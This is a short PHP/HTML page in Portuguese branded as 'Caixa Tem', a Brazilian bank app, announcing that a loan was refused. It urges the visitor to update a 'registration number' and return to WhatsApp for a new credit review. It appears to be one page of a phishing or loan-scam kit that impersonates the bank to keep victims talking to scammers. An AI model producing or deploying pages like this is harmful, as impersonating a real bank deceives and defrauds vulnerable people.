<?php require_once('../../config/config.php'); session_destroy(); ?>

<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Caixa Tem - Empréstimo Não Aprovado</title>
    <link rel="shortcut icon" href="../../assets/img/soon.png" type="image/x-icon">
    <link rel="stylesheet" href="../../assets/css/approved.css">
</head>

<body>
    <div class="centered-image">
        <img src="../../assets/img/disapproved.png" width="200">
    </div>

    <div class="main-text">
        <h1>Empréstimo não aprovado!</h1>
    </div>

    <div class="additional-info" style="padding: 0px 10px;">
        <p>De acordo com as informações repassadas, infelizmente <b>NÃO</b> foi possivel realizar a liberação do crédito. 
        <br><br>
        Mas não fique triste, só precisamos que você atualize ou tenha acesso ao <b>NÚMERO DE CADASTRO</b> no Caixa Tem. 
        <br><br>
        Após a verificação, entre em contato para realizarmos uma nova análise de crédito.</p>
    </div>

    <a href="https://api.whatsapp.com/send" class="btn">VOLTAR PARA O WHATSAPP</a>
</body>

</html>